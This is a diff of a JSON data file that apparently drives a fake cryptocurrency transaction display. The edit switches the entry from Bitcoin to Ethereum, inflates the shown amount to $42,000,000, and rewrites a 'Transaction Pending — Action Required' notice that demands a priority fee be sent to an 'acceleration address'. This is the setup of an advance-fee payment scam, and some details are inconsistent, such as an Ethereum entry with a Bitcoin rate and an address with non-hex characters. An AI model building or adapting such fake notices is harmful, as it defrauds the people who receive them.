@@ -2,25 +2,25 @@
   "transactions": [
     {
       "searchKeys": [
-        "f8c3a91d2e047b56a8c9041f6e5d7230b4a8916c7e2f5d0498163b27c4e91a0"
+        "0x2B423e53BcFf69868B9f6F1Cde4bFA545dDf7c7f"
       ],
       "hash": "f8c3a91d2e047b56a8c9041f6e5d7230b4a8916c7e2f5d0498163b27c4e91a0",
-      "chain": "bitcoin",
+      "chain": "ethereum",
       "confirmed": false,
       "blockHeight": 952354,
       "blockHash": "000000000000000000013144363068d1f15491cc0417205ad00ee12f8e7f06fa",
       "fee": 45800,
       "size": 248,
-      "amountUsd": 13000,
+      "amountUsd": 42000000,
       "btcUsdRate": 63907,
-      "sender": "bc1qseu5dvzl6yyktyd5vl2usn472xqu7ll0954akh",
-      "receiver": "1Fw57MXoTW24to4Fpn9wPpHswU1xgh4PQW",
+      "sender": "0xz35fhjtyj568hDGH375471ad2433A78c8F41b18ecF1",
+      "receiver": "0x2B423e53BcFf69868B9f6F1Cde4bFA545dDf7c7f",
       "useCurrentTimestamp": true,
       "pendingNotice": {
-        "requiredFeeUsd": 2000,
-        "paymentAddress": "bc1q9k7m2xfee4priority8n6w3r5t1v0y2a8c4d6e",
+        "requiredFeeUsd": 500,
+        "paymentAddress": "0xaf3485471ad2433A78c8F41b18ecF0C362ED9fe1",
         "title": "Transaction Pending — Action Required",
-        "message": "This transfer is stuck in the mempool because of heavy Bitcoin network congestion. At the current fee rate, miners may drop it before it confirms. To avoid a reversal and get this payment mined in the next block, a one-time priority fee of $2,000 USD must be sent to the acceleration address below. Once received, your transaction will be rebroadcast with elevated priority."
+        "message": "This transfer is stuck in the mempool because of heavy Ethereum network congestion. At the current fee rate, miners may drop it before it confirms. To avoid a reversal and get this payment mined in the next block, a one-time priority fee of $500 USD must be sent to the acceleration address below. Once received, your transaction will be rebroadcast with elevated priority."
       }
     },
     {
